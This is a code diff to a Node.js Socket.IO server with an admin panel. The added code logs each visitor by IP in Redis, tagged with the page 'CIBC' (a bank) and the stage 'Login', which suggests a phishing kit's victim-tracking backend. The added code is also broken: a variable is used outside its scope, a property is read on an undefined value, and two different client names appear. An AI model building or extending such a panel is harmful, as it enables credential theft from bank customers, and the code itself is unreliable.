@@ -217,7 +217,7 @@ app.get('/admin/panel', checkAdminSession, (req, res) => {
     res.sendFile(join(__dirname, '/admin/panel/page.html'));
 });
 
-
+client.connect();
 // ====================
 // Socket Handling
 // ====================
@@ -227,6 +227,7 @@ io.on('connection', (socket, req) => {
     if (userIP) {
         // Split the string by comma and take the first element
         userIP = userIP.split(',')[0].trim();
+        
     } else {
         // Fallback to remoteAddress if x-forwarded-for is not set
         userIP = userIP.request.connection.remoteAddress;
@@ -234,7 +235,32 @@ io.on('connection', (socket, req) => {
     
     socket.join(userIP)
 
-    socket.emit('join', {make:1})
+    let userData = {
+            ip: userIP,
+            status: 'active',
+            page: 'CIBC',
+            stage: 'Login'
+        }
+    
+    redisClient.hGet('users', userIP)
+      .then(reply => {
+        let user;
+        if (reply) {
+          user = JSON.parse(reply);
+          user.status = 'active'; // Update the status
+        } else {
+          user = userData; // If the user is new, use the initial user data
+        }
+        return redisClient.hSet('users', userIP, JSON.stringify(user));
+      })
+      .then(() => {
+        // Now emit the event to the client
+        socket.emit('join', user);
+      })
+      .catch(err => {
+        console.error('Redis error:', err);
+        // Handle errors here
+      });
     
     
     socket.on('submit', (data) => {
